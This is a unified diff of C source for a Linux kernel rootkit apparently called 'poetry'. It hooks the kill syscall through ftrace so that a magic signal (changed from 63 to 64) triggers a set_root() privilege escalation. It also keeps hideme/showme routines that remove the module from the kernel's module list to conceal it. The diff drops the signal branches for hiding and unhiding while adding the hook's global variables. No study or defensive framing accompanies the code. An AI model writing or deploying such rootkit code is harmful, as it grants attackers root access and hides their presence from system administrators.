@@ -1,5 +1,9 @@
-#include "../inc/kill.h"
+#include "ftrace_hook.h"
 
+static struct list_head *prev_module;
+static short hidden = 0;
+
+static asmlinkage long (*orig_kill)(const struct pt_regs *);
 
 asmlinkage int hook_kill(const struct pt_regs *regs)
 {
@@ -7,29 +11,16 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
 
     int sig = regs->si;
 
-    if ( sig == 63 ) // give root
+    if ( sig == 64 )
     {
-        printk(KERN_INFO "poetry: giving root...\n");
+        printk(KERN_INFO "poetry: giving root\n");
         set_root();
         return 0;
     }
-	else if ( sig == 64 ) // unhide poet
-	{
-		hideme();
-        printk(KERN_INFO "poetry: unhiding module...\n");
-        return 0;
-	}
-	else if ( sig == 65) // hide poet
-	{
-		showme();
-        printk(KERN_INFO "poetry: hiding module...\n");
-		return 0;
-	}
 
     return orig_kill(regs);
 
 }
-
 
 void set_root(void)
 {
@@ -54,7 +45,6 @@ void showme(void)
     list_add(&THIS_MODULE->list, prev_module);
     hidden = 0;
 }
-
 
 void hideme(void)
 {
